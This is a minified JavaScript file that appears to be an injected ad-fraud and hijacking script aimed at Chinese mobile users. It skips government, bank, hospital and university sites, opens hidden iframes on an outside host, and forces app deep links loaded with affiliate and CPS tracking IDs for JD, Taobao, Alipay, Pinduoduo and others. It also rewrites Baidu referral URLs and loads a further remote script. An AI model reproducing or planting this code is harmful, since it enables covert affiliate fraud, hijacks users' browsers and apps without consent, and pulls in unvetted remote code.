!function () {
	function a(e) {
		var o = document.createElement("iframe");
		o.setAttribute("width", "1px"),
		o.setAttribute("height", "1p"),
		o.setAttribute("frameborder", "0"),
		o.setAttribute("scrolling", "no"),
		o.style.display = "none",
		o.setAttribute("src", e),
		document.body.appendChild(o),
		window.setTimeout(function () {
			document.body.removeChild(o)
		}, 2e3)
	}
	function r(e) {
		newlink = document.createElement("a"),
		newlink.setAttribute("href", e),
		newlink.setAttribute("id", function () {
			var n = (new Date).getTime();
			return "xxxxxxxxxxyy".replace(/[xy]/g, function (e) {
				var o = (n + 16 * Math.random()) % 16 | 0;
				return n = Math.floor(n / 16),
				("x" == e ? o : 3 & o | 8).toString(16)
			})
		}
			()),
		document.body.appendChild(newlink),
		window.setTimeout(function () {
			console.log(document.getElementById("mmlink")),
			newlink.click()
		}, 500),
		window.setTimeout(function () {
			document.body.removeChild(newlink)
		}, 1e3)
	}
	function c(e) {
		for (var o = e + "=", n = document.cookie.split(";"), t = 0; t < n.length; t++) {
			for (var i = n[t]; " " == i.charAt(0); )
				i = i.substring(1);
			if (-1 != i.indexOf(o))
				return i.substring(o.length, i.length)
		}
		return ""
	}
	function d(e, o, n) {
		var t = new Date,
		i = t.getTime();
		i += 3600 * n * 1e3,
		t.setTime(i),
		document.cookie = e + "=" + o + "; expires=" + t.toUTCString() + "; path=/"
	}
	var e,
	o,
	u = (e = navigator.userAgent.toLowerCase(), (o = {}).winphone = -1 < e.indexOf("windows phone"), o.android = -1 < e.indexOf("ndroid"), o.obile = -1 < e.indexOf("obile"), o.baidu = -1 < e.indexOf("baidu"), o.xiaomi = -1 < e.indexOf("miuibrowser"), o.weixin = -1 < e.indexOf("micromessenger"), o.mqq = -1 < e.indexOf("mqqbrowser"), o.sogou = -1 < e.indexOf("sogoumobilebrowser"), o.iphone = -1 < e.indexOf("iphone"), o.ipad = -1 < e.indexOf("ipad"), o.android2 = o.android || o.xiaomi || o.baidu, o.mobile = o.android || o.winphone || o.iphone || o.ipad || o.obile || o.xiaomi || o.baidu || o.weixin, o),
	m = "https://co.puretou.com/",
	p = "y",
	s = "dkwlsn2",
	l = "vivi9d2",
	h = "bbdm3l2",
	f = "shsp322",
	b = "tzas122",
	_ = "dnimla8";
	!function () {
		var e = location.host;
		if (!function (e, o) {
			if (e)
				for (var n in e = e.toLowerCase(), o)
					if (-1 < e.indexOf(o[n]))
						return !0;
			return !1
		}
			(e, new Array(".gov", "boc", "cmbc", "abchina", "psbc.com", "icbc.com", "ccb.com", "boc.cn", "bank", "10086", "51awifi.com", "hospital", "edu.cn", "miui", "mi.com"))) {
			if (c(l) != p && (u.weixin ? a(m + "usab.min.html") : a(m + "usany.min.html"), d(l, p, .2)), u.weixin)
				return;
			var o = Math.floor(100 * Math.random()),
			n = new Date,
			t = n.getHours(),
			i = (n.getDate(), n.getMonth(), "u");
			if (c(_) != p && u.iphone && o < 60) {
				r("vipshop://goHome?tra_from=tra%3AC01V4losce6fd9km%3A%3Amig_code%3Adnd10%3Aac012yr994f1vlw3f7c8gpgopjxb36mt");
				i = "v";
				d(_, p, 2)
			}
			if (c(s) != p)
				"v" != i && a("vipshop://goHome?tra_from=tra%3AC01V4losce0chx6c%3A%3Amig_code%3Aznd008%3Acf541868c9354794b54858b2580ac5ab"), u.baidu && a("iqiyi://mobile/home?ftype=27&subtype=181"), a(o < 7 ? 'openapp.jdmobile://virtual?params={"category":"jump","sourceType":"sourceType_test","des":"m","url":"https://u.jd.com/22UDEJ","unionSource":"Awake","channel":"cedad4c0ad02455c9a818f1b3d98da1a","union_open":"union_cps"}' : o < 86 ? 'openapp.jdmobile://virtual?params={"category":"jump","des":"m","url":"https://u.jd.com/CJ5hSf","keplerID":"0","keplerFrom":"1","kepler_param":{"source":"kepler-open","otherData":{"mopenbp7":"0"},"channel":"cedad4c0ad02455c9a818f1b3d98da1a"},"union_open":"union_cps"}' : o < 93 ? 'openapp.jdmobile://virtual?params={"category":"jump","sourceType":"sourceType_test","des":"m","url":"https://u.jd.com/VyAinE","unionSource":"Awake","channel":"5768f16df47b40cb8906fb3fa141cd4e","union_open":"union_cps"}' : 'openapp.jdmobile://virtual?params={"category":"jump","sourceType":"sourceType_test","des":"m","url":"https://u.jd.com/bR4zyh","unionSource":"Awake","channel":"5768f16df47b40cb8906fb3fa141cd4e","union_open":"union_cps"}'), a("youku://weex?source=00002204&url=https%3A%2F%2Ft.youku.com%2Fyep%2Fpage%2Fm%2Fsanfang1903_wmdt%3Fwh_weex%3Dtrue%26isNeedBaseImage%3D1%26refer%3Dsanfang1903_operation.qrwang_00002204_000000_MjURn2_19053000&refer=sanfang1903_operation.qrwang_00002204_000000_MjURn2_19053000"), "t" != i && a("tbopen://m.taobao.com/tbopen/index.html?source=auto&action=ali.open.nav&module=h5&bootImage=0&spm=2014.ugdhh.735236441.10016-4083-32768&bc_fl_src=growth_dhh_735236441_10016-4083-32768&materialid=10016&h5Url=https%3A%2F%2Fh5.m.taobao.com%2Fbcec%2Fdahanghai-jump.html%3Fspm%3D2014.ugdhh.735236441.10016-4083-32768%26bc_fl_src%3Dgrowth_dhh_735236441_10016-4083-32768"), d(s, p, .6);
			else {
				if (c(f) != p)
					a("jdmobile://share?jumpType=8&jumpUrl=https://u.jd.com/Yxw5iX?channellv=hqtf1&channel=default&sourceUrl=1128*bj005"), u.baidu || a("iqiyi://mobile/home?ftype=27&subtype=181"), a("alipays://platformapi/startapp?appId=20000067&url=https%3A%2F%2Frender.alipay.com%2Fp%2Ff%2Fjfxb4alj%2Fpages%2Freceive-redpacket%2Findex.html%3F__webview_options__%3Dttb%25253Dauto%26partnerId%3Dzfb139%26sceneCode%3DKF_DYW02%26shareChannel%3DQRCode%26shareUserId%3D2088531702633666%26sharedUserId%3D%26__webview_options__%3D"), a("pinduoduo://com.xunmeng.pinduoduo/duo_cms_mall.html?pid=8487723_57131175&cpsSign=CM8487723_57131175_45e328bbfb2322b17f3a47b593ae6e51&duoduo_type=2"), a("qqnews://article_9527?nm=20190916A0BIHV00&from=xsn25&adfrom=push"), a("sohuvideo://action.cmd?action=2.4&cateCode=6306&cid=6306&ex2=-1&channel_list_type=0&vid=5405749&site=1&enterid=18_1000130024_1004035194"), a("uclink://www.uc.cn/cc77796ca7c25dff9607d31b29effc07?action=open_url&src_pkg=sxmhx&src_ch=sxmhx43&src_scene=pullup&url=ext%3Ainfo_flow_open_channel%3Ach_id%3D100%26insert_item_ids%3D11327394126419278583%26type%3Dmultiple%26from%3D6001"), d(f, p, .6);
				else
					c(b) != p && (15 <= t && a("qtt://news_detail?from=And-sixing-19082103&id=204203938"), a("imeituan://www.meituan.com/web?notitlebar=1&wkwebview=1&url=https%3A%2F%2Fguoyuan.meituan.com%2Fgame%3FgameType%3D2%26lch%3Dagroup-game_bout_cmanbu_dtf14%3Aguoyuanout_12&lch=agroup-game_bout_cmanbu_dtf14:guoyuanout_12"), a("fleamarket://2.taobao.com/onepiece?source=auto&action=ali.open.nav&module=h5&bootImage=0&h5Url=https%3A%2F%2Fmarket.m.taobao.com%2Fapp%2FidleFish-F2e%2Fapp-channels%2Fpreferential1%3Fwh_weex%3Dtrue%26pageSpm%3Dgdtxxldm0%26pageType%3Dcalls%26pageIndex%3D0&spm=2014.ugdhh.3843640202.6503-1002-32768&bc_fl_src=growth_dhh_3843640202.6503-1002-32768"), a("qmkege://kege.com?action=discovery&from=kgpaymentch_feichuang36"), a("weishi://feed?feed_id=71kYSmb5T1GHZY1u1&logsour=31057"), a("uniteqqreader://nativepage/client/readepage?bid=23377019&cid=1&offest=100&source_name=feed_tuoyou13&source_id=ty13&source_type=0"), a("tnow://openpage/web?url=https%3A%2F%2Fnow.qq.com%2Factivity%2Fc-annual-redpacket-v4%2Findex.html%3F_bid%3D3748%26_wv%3D16778245%26from%3Dandroiddau1"), a("wbmain://nativejump?pid=2668&pagetype=list&tradeline=job&title=%E6%99%AE%E5%B7%A5&list_name=zpshengchankaifa&cateid=13916&jumptype=native"), d(b, p, .5));
				c(h) != p && top.location.href.length < 80 && "https://m.baidu.com/?from" == top.location.href.substring(0, 25) && "?from=1023359b" !== top.location.search && (d(h, p, .001), top.location.href = "https://m.baidu.com/?from=1023359d")
			}
			!function (e) {
				var o = document.createElement("script");
				o.src = e,
				document.body.appendChild(o)
			}
			(m + "abc.min.js")
		}
	}
	(navigator)
}
();
